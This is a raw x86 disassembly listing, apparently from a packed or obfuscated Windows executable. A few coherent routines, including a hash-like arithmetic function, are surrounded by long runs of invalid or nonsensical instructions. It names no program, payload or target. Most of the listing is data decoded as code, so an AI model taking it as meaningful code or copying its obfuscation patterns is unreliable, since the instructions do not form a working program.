  405210:	jmp    0x40521f
  405212:	xchg   esi,eax
  405213:	jmp    0x2ae2bf67
  405218:	or     DWORD PTR [edi-0x7a11a474],ebx
  40521e:	mov    edi,0xe994e84b
  405223:	lea    ecx,[ecx]
  405225:	hlt    
  405226:	inc    ebp
  405227:	xor    BYTE PTR [ebp+0x54],dl
  40522a:	and    BYTE PTR [esi-0x335719a],al
  405230:	pop    eax
  405231:	cwde   
  405232:	or     edx,DWORD PTR [eax]
  405234:	pushf  
  405235:	xor    BYTE PTR [edi-0x46fcb339],0x89
  40523c:	inc    ebp
  40523d:	or     al,0x8b
  40523f:	inc    ebp
  405240:	cld    
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0xf300d739
  40528d:	loop   0x4052ea
  40528f:	sub    bh,BYTE PTR [esi+0x7e]
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x40525b
  405297:	loop   0x405256
  405299:	dec    eax
  40529a:	cld    
  40529b:	sahf   
  40529c:	jns    0x4052df
  40529e:	mov    edi,DWORD PTR [esi+0x7557732c]
  4052a4:	retf   0xee8b
  4052a7:	cli    
  4052a8:	jbe    0x405259
  4052aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ac:	xlat   BYTE PTR ds:[ebx]
  4052ad:	dec    ebp
  4052ae:	outs   dx,BYTE PTR ds:[esi]
  4052af:	clc    
  4052b0:	xor    DWORD PTR [eax+0x41],eax
  4052b3:	jbe    0x40530b
  4052b5:	out    dx,eax
  4052b6:	cld    
  4052b7:	mov    ds:0x47022715,eax
  4052bc:	sub    eax,0x1f32d436
  4052c1:	jge    0x40528f
  4052c3:	xchg   esi,eax
  4052c4:	xlat   BYTE PTR ds:[ebx]
  4052c5:	add    eax,0x6569de21
  4052ca:	inc    esp
  4052cb:	inc    esi
  4052cc:	push   0xffffffbe
  4052ce:	and    ecx,0x7019fe81
  4052d4:	push   0xfffffffa
  4052d6:	cmp    DWORD PTR [edi+0x44691af3],ebp
  4052dc:	add    ebp,ebp
  4052de:	push   ecx
  4052df:	jo     0x4052e6
  4052e1:	mov    eax,0xe646980
  4052e6:	cmc    
  4052e7:	xchg   DWORD PTR [ebx+0x7b],esp
  4052ea:	cmp    al,0x57
  4052ec:	mov    edi,?
  4052ee:	mov    cs,WORD PTR [edx-0x6]
  4052f1:	inc    ebx
  4052f2:	popf   
  4052f3:	scas   al,BYTE PTR es:[edi]
  4052f4:	out    dx,eax
  4052f5:	aad    0x57
  4052f7:	out    0xfe,al
  4052f9:	pop    edx
  4052fa:	out    0x3,al
  4052fc:	sbb    al,0x55
  4052fe:	xchg   esi,eax
  4052ff:	mov    dh,0xfa
  405301:	inc    ebp
  405302:	or     BYTE PTR [ebp-0xcbb0df2],al
  405308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405309:	add    eax,0x9a313e29
  40530e:	retf   
  40530f:	mov    cl,0x88
  405311:	outs   dx,DWORD PTR ds:[esi]
  405312:	mov    ah,0x28
  405314:	lods   eax,DWORD PTR ds:[esi]
  405315:	xchg   ebx,eax
  405316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405317:	rcr    ebp,cl
  405319:	(bad)  
  40531a:	fld    QWORD PTR [eax+ecx*2-0x7]
  40531e:	cmp    BYTE PTR [esi+ebx*4+0x2e699dd9],cl
  405325:	push   0x9b580596
  40532a:	dec    ecx
  40532b:	out    0x71,eax
  40532d:	test   BYTE PTR [esi],dl
  40532f:	jo     0x4052c0
  405331:	daa    
  405332:	cld    
  405333:	xchg   ecx,eax
  405334:	jb     0x40536a
  405336:	pop    ecx
  405337:	xchg   edi,eax
  405338:	pop    ss
  405339:	mov    esi,0x2f9aa86f
  40533e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40533f:	jmp    DWORD PTR [ecx+0x44]
  405342:	icebp  
  405343:	sub    al,0xfe
  405345:	jno    0x4052ce
  405347:	mov    cl,0x6
  405349:	cmp    DWORD PTR [edx],0xffffffe4
  40534c:	scas   al,BYTE PTR es:[edi]
  40534d:	push   ebx
  40534e:	pop    edi
  40534f:	nop
  405350:	mov    esi,0x13c69385
  405355:	jle    0x4053b9
  405357:	mov    DWORD PTR [ecx],esi
  405359:	push   esp
  40535a:	sbb    al,0xdb
  40535c:	icebp  
  40535d:	xor    ch,BYTE PTR [ebp+0x7a013b65]
  405363:	mov    ecx,0x4079874d
  405368:	lds    ecx,FWORD PTR [edi]
  40536a:	fld    TBYTE PTR [ebx]
  40536c:	stc    
  40536d:	jb     0x40539b
  40536f:	or     BYTE PTR [ebx+0x35e97a87],bh
  405375:	inc    eax
  405376:	out    dx,al
  405377:	or     eax,0xc8efcd79
  40537c:	xor    dl,dl
  40537e:	jnp    0x405392
  405380:	xlat   BYTE PTR ds:[ebx]
  405381:	adc    ecx,DWORD PTR [ebx-0x4]
  405384:	inc    edx
  405385:	shl    eax,1
  405387:	std    
  405388:	dec    edx
  405389:	dec    ecx
  40538a:	sub    BYTE PTR [esi-0x70f5a465],dh
  405390:	std    
  405391:	je     0x405343
  405393:	rcr    DWORD PTR [ebp+0x6e594c3a],1
  405399:	lods   eax,DWORD PTR ds:[esi]
  40539a:	xchg   DWORD PTR [edi],edx
  40539c:	rcr    cl,1
  40539e:	sub    bh,BYTE PTR [eax+ecx*1-0x2093aa67]
  4053a5:	pop    ds
  4053a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a7:	cmp    DWORD PTR [edx-0x38],ecx
  4053aa:	jb     0x405347
  4053ac:	push   0x9
  4053ae:	mov    BYTE PTR [eax-0x73],dh
  4053b1:	repz and eax,0x9818557f
  4053b7:	and    eax,0x177485c8
  4053bc:	xor    eax,0x592602c8
  4053c1:	and    cl,BYTE PTR [esi-0x2e]
  4053c4:	pop    edi
  4053c5:	and    BYTE PTR [eax],ah
  4053c7:	add    dh,al
  4053c9:	dec    ecx
  4053ca:	icebp  
  4053cb:	cwde   
  4053cc:	pop    es
  4053cd:	and    DWORD PTR [ecx+ebp*1-0x3676da01],eax
  4053d4:	mov    eax,0xfc89da27
  4053d9:	xchg   ebx,eax
  4053da:	xlat   BYTE PTR ds:[ebx]
  4053db:	pop    edx
  4053dc:	outs   dx,DWORD PTR ds:[esi]
  4053dd:	daa    
  4053de:	add    BYTE PTR [eax+0x453804ff],0x66
  4053e5:	dec    eax
  4053e6:	mov    WORD PTR [ebx+0x49],?
  4053e9:	test   BYTE PTR [esi+0x4877951c],0x82
  4053f0:	int3   
  4053f1:	shl    BYTE PTR [ecx+0x2],0x8f
  4053f5:	push   ebp
  4053f6:	mov    BYTE PTR [ebp-0x7c],ah
  4053f9:	test   al,0x97
  4053fb:	lahf   
  4053fc:	into   
  4053fd:	(bad)  
  4053fe:	mov    bl,BYTE PTR [ebp-0x3a1eee1f]
  405404:	mov    edx,0xf7b6209d
  405409:	pop    esi
  40540a:	pop    ebp
  40540b:	cmp    ebp,DWORD PTR [edi]
  40540d:	dec    edi
  40540e:	jge    0x40541f
  405410:	fwait
  405411:	int    0x90
  405413:	out    dx,al
  405414:	push   esp
  405415:	and    esp,DWORD PTR [ebp+0x488985af]
  40541b:	mov    dl,0x92
  40541d:	call   0xea6f:0xf063c687
  405424:	js     0x4053ad
  405426:	jl     0x4053f8
  405428:	(bad)  
  405429:	xchg   ecx,eax
  40542a:	mov    al,ds:0x4ad40718
  40542f:	mov    bl,0x48
  405431:	push   es
  405432:	popa   
  405433:	test   DWORD PTR [esi-0x46],ebp
  405436:	push   esp
  405437:	(bad)
  40543b:	je     0x405425
  40543d:	out    0x70,al
  40543f:	mov    esi,0x8fa90956
  405444:	mov    dl,0x18
  405446:	sub    DWORD PTR [ecx-0x5b],0xd8d4606d
  40544d:	jae    0x4053d3
  40544f:	adc    BYTE PTR [esi],0xef
  405452:	cwde   
  405453:	pop    ebx
  405454:	sbb    DWORD PTR [edx+0x64],0x11
  405458:	and    bh,dh
  40545a:	xchg   esi,eax
  40545b:	aam    0xd8
  40545d:	or     bl,al
  40545f:	(bad)  
  405460:	mov    ch,0x1e
  405462:	out    0xd4,eax
  405464:	sub    esp,DWORD PTR [ecx]
  405466:	jmp    0xb190:0x357992a0
  40546d:	mov    ch,0x53
  40546f:	push   edx
  405470:	adc    DWORD PTR ds:0xebcdaead,eax
  405476:	std    
  405477:	mov    ah,bl
  405479:	cmp    eax,0x6494c55f
  40547e:	pop    ecx
  40547f:	lods   eax,DWORD PTR ds:[esi]
  405480:	push   ecx
  405482:	nop
  405483:	fisttp QWORD PTR [esi-0x73]
  405486:	ss inc edi
  405488:	outs   dx,DWORD PTR ds:[esi]
  405489:	scas   eax,DWORD PTR es:[edi]
  40548a:	add    BYTE PTR [ecx+0x6070e78f],0x1a
  405491:	neg    DWORD PTR [esi+0x5fa5d1a7]
  405497:	ds jecxz 0x405496
  40549a:	out    0xb,eax
  40549c:	mov    al,ds:0x8075db75
  4054a1:	repnz enter 0x3c81,0x6d
  4054a6:	and    al,0x8
  4054a8:	push   0x1b
  4054aa:	pop    es
  4054ab:	(bad)
  4054af:	(bad)  
  4054b0:	neg    DWORD PTR ds:0x953f4752
  4054b6:	aad    0x1b
  4054b8:	data16 clc 
  4054ba:	out    0x23,al
  4054bc:	push   ebx
  4054bd:	jns    0x40549a
  4054bf:	or     cl,BYTE PTR [ebp+0x54e02b74]
  4054c5:	jae    0x4054d7
  4054c7:	jnp    0x40549d
  4054c9:	cmp    bl,BYTE PTR [ebx+eax*8]
  4054cc:	call   0x241161b6
  4054d1:	in     al,0xe6
  4054d3:	jg     0x40549f
  4054d5:	push   ds
  4054d6:	mov    bh,0x25
  4054d8:	add    BYTE PTR [edi+edx*8-0x675bd931],ch
  4054df:	ja     0x40548b
  4054e1:	push   edx
  4054e2:	mov    ebx,0x9716f936
  4054e7:	pusha  
  4054e8:	dec    edi
  4054e9:	ja     0x40554b
  4054eb:	out    0xc7,al
  4054ed:	mov    eax,0x97718a1f
  4054f2:	xor    esi,DWORD PTR [edi+0x5a]
  4054f5:	aad    0x51
  4054f7:	add    esi,DWORD PTR [esi+eiz*8-0x4c]
  4054fb:	movzx  eax,bx
  4054fe:	mov    edi,0x356097d2
  405503:	test   DWORD PTR [ebx],ebp
  405505:	scas   eax,DWORD PTR es:[edi]
  405506:	adc    edi,esi
  405508:	bswap  ecx
  40550a:	jp     0x4054a9
  40550c:	mov    BYTE PTR [ecx+eax*2],dh
  40550f:	call   0x1fa273fc
  405514:	in     al,0x2
  405516:	fwait
  405517:	push   edi
  405518:	xchg   DWORD PTR [ebp-0x60f10a53],edi
  40551e:	inc    ecx
  40551f:	mov    bh,0xe0
  405521:	call   0x6c015eac
  405526:	inc    ebp
  405527:	push   edx
  405528:	aaa    
  405529:	in     al,0xf
  40552b:	leave  
  40552c:	pusha  
  40552d:	mov    edx,0xdd7bb510
  405532:	cli    
  405533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405534:	pop    ebx
  405535:	xchg   esi,eax
  405536:	ins    BYTE PTR es:[edi],dx
  405537:	inc    ebx
  405538:	mov    dh,0xc6
  40553a:	dec    ecx
  40553b:	scas   al,BYTE PTR es:[edi]
  40553c:	push   ds
  40553d:	js     0x405558
  40553f:	jb     0x4054f7
  405541:	mov    cl,0x55
  405543:	ret    0x7ab6
  405546:	and    ch,bl
  405548:	xchg   edi,eax
  405549:	das    
  40554a:	xchg   ecx,eax
  40554b:	pop    DWORD PTR [edi-0x2c501f61]
  405551:	lahf   
  405552:	call   FWORD PTR [ecx+0x744bcec7]
  405558:	stc    
  405559:	and    eax,DWORD PTR [edx-0x62]
  40555c:	cmp    DWORD PTR [edi+0xf431ac9],edx
  405562:	mov    ah,0x1c
  405564:	cs mov esi,0x969d7266
  40556a:	icebp  
  40556b:	fmul   QWORD PTR es:[ecx+0x302869fa]
  405572:	mov    edx,0xb22c1aac
  405577:	stc    
  405578:	fsub   QWORD PTR [esi-0x147ed72b]
  40557e:	sub    cl,BYTE PTR [edi+0x1]
  405581:	data16 jl 0x4055aa
  405584:	mov    esi,eax
  405586:	push   ds
  405587:	cmc    
  405588:	les    esp,FWORD PTR [edx+ebx*1+0xb]
  40558c:	mov    esi,0xdcc07fba
  405591:	push   0x74
  405593:	or     DWORD PTR [ebp-0x5c8d77e0],edi
  405599:	sahf   
  40559a:	and    al,0x15
  40559c:	mov    es,WORD PTR [edi-0x25d3302c]
  4055a2:	mov    ds:0x3ad6ecb4,eax
  4055a7:	mov    ebp,0xc0c1ba90
  4055ac:	nop
  4055ad:	push   ebp
  4055ae:	mov    eax,edi
  4055b0:	dec    esi
  4055b1:	or     al,0x75
  4055b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b4:	xchg   BYTE PTR [ecx-0x7b450a9a],ah
  4055ba:	sbb    cl,ah
  4055bc:	jmp    0x5fb4:0xe8fcbeb2
  4055c3:	loope  0x405586
  4055c5:	sar    edi,cl
  4055c7:	sub    eax,DWORD PTR [esi]
  4055c9:	jne    0x405638
  4055cb:	push   0x9ec7ccea
  4055d0:	push   edi
  4055d1:	push   eax
  4055d2:	aam    0x2f
  4055d4:	xor    BYTE PTR [esi],cl
  4055d6:	mov    ebx,0xf0f1bfdb
  4055db:	sbb    dl,BYTE PTR [ecx-0x48]
  4055de:	lahf   
  4055df:	cld    
  4055e0:	mov    ds:0xfc458905,eax
  4055e5:	mov    DWORD PTR ds:0x4344f3,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	cs mov ah,0x1e
  405605:	rcr    BYTE PTR [eax+0x7e7e3621],0xc4
  40560c:	jns    0x40568c
  40560e:	jle    0x4055ae
  405610:	jge    0x40559c
  405612:	fs mov dh,0xce
  405615:	test   al,0xf9
  405617:	test   al,0x48
  405619:	aam    0xef
  40561b:	popf   
  40561c:	sub    bl,BYTE PTR [eax+0x19d2fae8]
  405622:	mov    esi,0xae8f4fed
  405627:	mov    esi,0x8c6a79d9
  40562c:	jmp    DWORD PTR [ebx+eax*1+0x14]
  405630:	div    esp
  405632:	les    edi,FWORD PTR [edx-0x9]
  405635:	push   ebx
  405636:	sub    BYTE PTR [edi-0x5c],bl
  405639:	xchg   edx,eax
  40563a:	add    al,0x56
  40563c:	rcr    bh,cl
  40563e:	mov    al,0x26
  405640:	scas   al,BYTE PTR es:[edi]
  405641:	(bad)  
  405643:	test   DWORD PTR [edx+0x4e938e15],0x3af89954
  40564d:	out    0x19,al
  40564f:	jb     0x4056cf
  405651:	xor    al,ah
  405653:	ja     0x4056c1
  405655:	pop    ecx
  405656:	push   edi
  405657:	rcr    BYTE PTR [ebx+ebp*8],0x6f
  40565b:	cmp    al,0x14
  40565d:	popa   
  40565e:	pop    es
  40565f:	fcom   DWORD PTR [esi-0x7a5d561f]
  405665:	cwde   
  405666:	fcomp  QWORD PTR [edx-0x6c3d23f]
  40566c:	cld    
  40566d:	xchg   edx,eax
  40566e:	test   al,0x45
  405670:	sbb    BYTE PTR [ebx+0x226c1e59],cl
  405676:	test   eax,0xeef27bd4
  40567b:	fwait
  40567c:	and    edi,DWORD PTR [edi-0x1c]
  40567f:	into   
  405680:	sbb    BYTE PTR [esi-0x7c5aed14],dh
  405686:	shl    BYTE PTR [edx+edx*2-0x54],cl
  40568a:	dec    eax
  40568b:	ins    BYTE PTR es:[edi],dx
  40568c:	mov    dl,0x19
  40568e:	push   0x8
  405690:	jmp    0x6b61f84e
  405695:	scas   eax,DWORD PTR es:[edi]
  405696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405697:	(bad)  
  405698:	aaa    
  405699:	push   edx
  40569a:	pushf  
  40569b:	sub    ch,BYTE PTR [edx+0x62]
  40569e:	out    0x9a,eax
  4056a0:	xor    edx,edx
  4056a2:	mov    ds:0x444e28ce,eax
  4056a7:	test   al,0x50
  4056a9:	repz ficomp DWORD PTR [edx+0x10]
  4056ad:	jnp    0x405718
  4056af:	and    BYTE PTR [ecx+0x26],0x39
  4056b3:	inc    esp
  4056b4:	sub    al,0x7f
  4056b6:	xchg   ebp,eax
  4056b7:	pushf  
  4056b8:	scas   eax,DWORD PTR es:[edi]
  4056b9:	push   ebx
  4056ba:	hlt    
  4056bb:	into   
  4056bc:	sbb    ebp,ecx
  4056be:	imul   eax,edx,0xffffffbb
  4056c1:	sti    
  4056c2:	cmp    bh,ah
  4056c4:	xor    eax,0xd57376a4
  4056c9:	repz lds ebx,FWORD PTR [ebp+0x60e33ceb]
  4056d0:	jno    0x40565e
  4056d2:	ja     0x4056db
  4056d4:	fs and ah,BYTE PTR gs:[ebx-0x78]
  4056d9:	sub    bh,BYTE PTR [ecx+edi*2+0x1]
  4056dd:	lods   eax,DWORD PTR ds:[esi]
  4056de:	pop    eax
  4056df:	or     eax,0x229e64d6
  4056e4:	(bad)  
  4056e5:	lahf   
  4056e6:	push   ebx
  4056e7:	iret   
  4056e8:	clc    
  4056e9:	lods   al,BYTE PTR ds:[esi]
  4056ea:	stos   BYTE PTR es:[edi],al
  4056eb:	out    0x69,al
  4056ed:	ficomp WORD PTR [eax]
  4056ef:	test   BYTE PTR [ecx+0x62],dh
  4056f2:	dec    esi
  4056f3:	retf   
  4056f4:	xchg   ecx,eax
  4056f5:	mov    edi,0x9849d988
  4056fa:	or     BYTE PTR [edi+0x44c4d1f1],dl
  405700:	pop    ds
  405701:	xchg   edx,eax
  405702:	jg     0x405743
  405704:	jecxz  0x405697
  405706:	(bad)  
  405707:	test   al,0xa4
  405709:	mov    edx,0x56e91924
  40570e:	add    esi,DWORD PTR [edx-0x36]
  405711:	imul   esi,DWORD PTR [bx-0x63],0x38e67914
  405719:	arpl   WORD PTR cs:[edx-0x62],si
  40571d:	test   dl,bl
  40571f:	cmp    bl,BYTE PTR [ebx+0x43]
  405722:	sbb    eax,0xc6309f6c
  405727:	sub    al,0xbb
  405729:	fwait
  40572a:	out    dx,al
  40572b:	pop    esp
  40572c:	ror    DWORD PTR [edx-0x47aaa529],0x74
  405733:	repz xor DWORD PTR ds:0x766b6393,0x6872c6f2
  40573e:	jp     0x4057aa
  405740:	jb     0x4057a4
  405742:	mov    ch,BYTE PTR [ebp+0x47]
  405745:	or     eax,0x38f4a8cd
  40574a:	pop    edi
  40574b:	cli    
  40574c:	jp     0x40579e
  40574e:	vpsrlw xmm0,xmm1,XMMWORD PTR [ebp+0x31]
  405753:	test   BYTE PTR [esp+ebx*1],0x47
  405757:	inc    ebx
  405758:	scas   eax,DWORD PTR es:[edi]
  405759:	rcr    BYTE PTR [ecx],cl
  40575b:	or     al,0x4c
  40575d:	clc    
  40575e:	adc    DWORD PTR [ecx+0x1476b5af],ebp
  405764:	jge    0x405718
  405766:	aas    
  405767:	aad    0x77
  405769:	cmp    al,0xc6
  40576b:	pop    ebx
  40576c:	das    
  40576d:	fsubr  QWORD PTR [edx]
  40576f:	inc    esp
  405770:	xor    ah,dh
  405772:	retf   
  405773:	jl     0x405743
  405775:	test   BYTE PTR [edx],cl
  405777:	inc    ecx
  405778:	das    
  405779:	in     al,dx
  40577a:	fisttp WORD PTR [eax-0x782a2607]
  405780:	inc    esp
  405781:	push   DWORD PTR [ecx-0x80]
  405784:	xlat   BYTE PTR ds:[ebx]
  405785:	aaa    
  405786:	daa    
  405787:	lock jmp 0x4057a9
  40578a:	test   BYTE PTR [ebp+0x7e8331db],ah
  405790:	or     ah,dl
  405792:	ja     0x4057c4
  405794:	jb     0x40577b
  405796:	dec    ebx
  405797:	push   ds
  405798:	cwde   
  405799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40579a:	jmp    0x21db263b
  40579f:	or     ecx,DWORD PTR [ebp-0x5f]
  4057a2:	ret    
  4057a3:	frstor [edx]
  4057a5:	adc    DWORD PTR [ebx-0x3f],edx
  4057a8:	popf   
  4057a9:	scas   al,BYTE PTR es:[edi]
  4057aa:	pop    ebp
  4057ab:	xchg   ecx,eax
  4057ac:	aam    0xa3
  4057ae:	add    esi,DWORD PTR [eax+eiz*2]
  4057b1:	mov    dh,0xd5
  4057b3:	cmp    ecx,esp
  4057b5:	loope  0x405835
  4057b7:	adc    BYTE PTR [eax+eiz*1-0x5c98a6b3],bl
  4057be:	fdiv   QWORD PTR [ebx+0x5369eb89]
  4057c4:	dec    esp
  4057c5:	adc    esp,ebp
  4057c7:	xor    BYTE PTR [ebp-0x6],0x69
  4057cb:	loope  0x405834
  4057cd:	nop
  4057ce:	in     al,dx
  4057cf:	imul   edi,DWORD PTR [edi*8-0x4e14fcec],0xffffffa3
  4057d7:	or     al,0xa8
  4057d9:	mov    bh,0x2e
  4057db:	xchg   edi,eax
  4057dc:	loope  0x405857
  4057de:	lock sbb DWORD PTR [bx+si-0x4142],edx
  4057e4:	out    dx,al
  4057e5:	mov    dl,0x53
  4057e7:	xlat   BYTE PTR ds:[ebx]
  4057e8:	mov    WORD PTR [ebp+0x11],fs
  4057eb:	mov    ebp,0xcd002342
  4057f0:	cld    
  4057f1:	sar    DWORD PTR [ebp-0x2246be6b],0xaf
  4057f8:	pop    esp
  4057f9:	mov    ebx,0x5264d58f
  4057fe:	jle    0x4057e9
  405800:	push   esp
  405801:	cmovg  esi,DWORD PTR [ebx]
  405804:	xlat   BYTE PTR ds:[ebx]
  405805:	ds mov dl,0xcd
  405808:	jge    0x405839
  40580a:	fisub  WORD PTR [edi]
  40580c:	mov    ds:0xc47b9ce0,eax
  405811:	sahf   
  405812:	sub    BYTE PTR [eax+0x41],ah
  405815:	mov    edx,0xc22dd5e2
  40581a:	cmp    DWORD PTR [eax-0x43],ebx
  40581d:	jp     0x4057c0
  40581f:	fs mov ch,0xc0
  405822:	shl    esp,1
  405824:	aad    0x49
  405826:	aaa    
  405827:	jmp    0x30280bf1
  40582c:	fwait
  40582d:	inc    edi
  40582e:	fbstp  TBYTE PTR [ecx+0x6685ed6a]
  405834:	js     0x405877
  405836:	xchg   esp,eax
  405837:	nop
  405838:	inc    ebp
  405839:	in     eax,0xfb
  40583b:	ds mov dl,0xb0
  40583e:	jne    0x40582a
  405840:	mov    al,0x35
  405842:	fisub  DWORD PTR [edi+eiz*4]
  405845:	hlt    
  405846:	push   es
  405847:	adc    bh,BYTE PTR [edi]
  405849:	push   ebp
  40584a:	(bad)  
  40584b:	into   
  40584c:	inc    ebx
  40584d:	in     eax,0xec
  40584f:	cdq    
  405850:	sub    eax,0x8fa71972
  405855:	mov    cl,0x8d
  405857:	retf   0xdb88
  40585a:	jbe    0x40583a
  40585c:	cmp    BYTE PTR [edx+edi*8-0x2f],dl
  405860:	mov    edx,0xb95dbcd6
  405865:	les    edi,FWORD PTR [ebx-0x2e]
  405868:	repz mov edi,0x4e51f81e
  40586e:	push   0x35
  405870:	shl    DWORD PTR [eax],cl
  405872:	mov    DWORD PTR [ecx],esi
  405874:	outs   dx,DWORD PTR ds:[esi]
  405875:	dec    ebp
  405876:	nop
  405877:	mov    ecx,DWORD PTR [eax-0x1fb19d4d]
  40587d:	mov    ds:0x639c4a57,eax
  405882:	rcl    BYTE PTR [edx-0x68abded],0xdd
  405889:	loop   0x405822
  40588b:	pop    esi
  40588c:	out    dx,al
  40588d:	call   0x5701:0x9bbabc2f
  405894:	mov    dl,0xdc
  405896:	pop    ss
  405897:	pop    ecx
  405898:	lods   eax,DWORD PTR ds:[esi]
  405899:	xor    al,0x67
  40589b:	pop    cx
  40589d:	loopne 0x4058de
  40589f:	shrd   ecx,edx,0x81
  4058a3:	bound  ebp,QWORD PTR ds:0x6e142289
  4058a9:	push   edi
  4058aa:	fidivr DWORD PTR [ecx]
  4058ac:	leave  
  4058ad:	inc    edi
  4058ae:	inc    esi
  4058af:	mov    ebx,0xf7c1c88a
  4058b4:	repnz aas 
  4058b6:	xchg   BYTE PTR [ecx-0x2d],ch
  4058b9:	into   
  4058ba:	mov    esi,0x6d7dd311
  4058bf:	xor    eax,0x577020c5
  4058c4:	inc    ebp
  4058c5:	and    eax,0x9c2f20ee
  4058ca:	ins    BYTE PTR es:[edi],dx
  4058cb:	(bad)  
  4058cc:	aaa    
  4058cd:	inc    edx
  4058ce:	fld    DWORD PTR ds:0x483302bc
  4058d5:	rcl    ch,cl
  4058d7:	mov    ecx,DWORD PTR [esi+0x5e]
  4058da:	jbe    0x405864
  4058dc:	pinsrw mm0,WORD PTR [edx],0xac
  4058e0:	iret   
  4058e1:	mov    esi,0xa45eff83
  4058e6:	aaa    
  4058e7:	or     esi,DWORD PTR [ecx]
  4058e9:	ret    0x6374
  4058ec:	clc    
  4058ed:	loop   0x405880
  4058ef:	pop    es
  4058f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058f1:	ins    DWORD PTR es:[edi],dx
  4058f2:	push   ebp
  4058f3:	cmp    al,0x3a
  4058f5:	pop    ebx
  4058f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058f7:	lea    edx,[eax-0x2c]
  4058fa:	push   esp
  4058fb:	inc    ebx
  4058fc:	imul   edx,DWORD PTR [edx+edi*4-0x5f2de8f1],0xacdf79e5
  405907:	cs es es test eax,0x9dee3b5b
  40590f:	test   DWORD PTR [edi-0x80],esp
  405912:	loope  0x405970
  405914:	stc    
  405915:	(bad)  
  405916:	mov    edx,0xd42cfdac
  40591b:	and    ah,bl
  40591d:	mov    BYTE PTR [ebx+0xbf7dd18],bl
  405923:	cmc    
  405924:	js     0x40595e
  405926:	inc    esi
  405927:	pusha  
  405928:	ss jns 0x4059a4
  40592b:	js     0x4058ce
  40592d:	stos   DWORD PTR es:[edi],eax
  40592e:	cmc    
  40592f:	test   DWORD PTR [ecx],esi
  405931:	ins    BYTE PTR es:[edi],dx
  405932:	sbb    BYTE PTR ss:[esi],dh
  405935:	int3   
  405936:	inc    ecx
  405937:	sub    eax,0xc3c23e77
  40593c:	mov    ah,0x97
  40593e:	mov    bh,0xda
  405940:	jmp    0x405966
  405942:	add    al,0x31
  405944:	mov    al,ds:0xf0575eca
  405949:	and    cl,BYTE PTR ds:0x6685136f
  40594f:	fld    TBYTE PTR [edi+0x52]
  405952:	pusha  
  405953:	scas   al,BYTE PTR es:[edi]
  405954:	add    al,bh
  405956:	inc    ebp
  405957:	clc    
  405958:	cmp    DWORD PTR [edi+0x0],ecx
  40595b:	add    bh,al
  40595d:	add    eax,0x4345d3
  405962:	dec    edx
  405963:	and    al,BYTE PTR [eax]
  405965:	add    cl,ch
  405967:	pop    esi
  405968:	add    eax,DWORD PTR [eax]
  40596a:	add    BYTE PTR [edx+0x71b8a1ab],bh
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	xchg   BYTE PTR [ecx+0x31ef9bdd],cl
  40597d:	jle    0x4059fd
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x4059d6
  405984:	imul   esi,DWORD PTR [edx],0xffffffba
  405987:	out    dx,al
  405988:	popf   
  405989:	in     eax,dx
  40598a:	fs pop eax
  40598c:	xchg   edx,eax
  40598d:	ret    
  40598e:	(bad)  
  40598f:	sbb    cx,WORD PTR ds:[eax]
  405993:	mov    ecx,0x94f72d14
  405998:	mov    esi,0xb6c912b1
  40599d:	cld    
  40599e:	int3   
  40599f:	in     eax,0x23
  4059a1:	cli    
  4059a2:	enter  0x5b9e,0x69
  4059a6:	cwde   
  4059a7:	cmp    al,0x9c
  4059a9:	xchg   ebx,eax
  4059aa:	push   esp
  4059ab:	loope  0x40599c
  4059ad:	outs   dx,BYTE PTR ds:[esi]
  4059ae:	mov    ebx,0xdb09daad
  4059b3:	retf   
  4059b4:	cwde   
  4059b5:	aaa    
  4059b6:	jne    0x40593e
  4059b8:	cmp    BYTE PTR [edi-0x11a6e812],dh
  4059be:	mov    DWORD PTR [esi-0x705e3bba],esi
  4059c4:	xchg   BYTE PTR [edi-0xfd7132c],bh
  4059ca:	in     eax,0xfd
  4059cc:	jmp    0xd87f:0x2b54ed0b
  4059d3:	jo     0x4059a5
  4059d5:	jl     0x405981
  4059d7:	sub    al,0xf1
  4059d9:	repz test BYTE PTR [ebp+0x8],al
  4059dd:	fs fcomi st,st(3)
  4059e0:	adc    dl,dh
  4059e2:	sub    eax,0x61d298b5
  4059e7:	shl    DWORD PTR [ebx-0x6d42626c],0x5e
  4059ee:	fadd   st,st(1)
  4059f0:	dec    ebx
  4059f1:	jecxz  0x405a27
  4059f3:	push   0x4d
  4059f5:	mov    edi,0x550f329c
  4059fa:	das    
  4059fb:	jg     0x405a7b
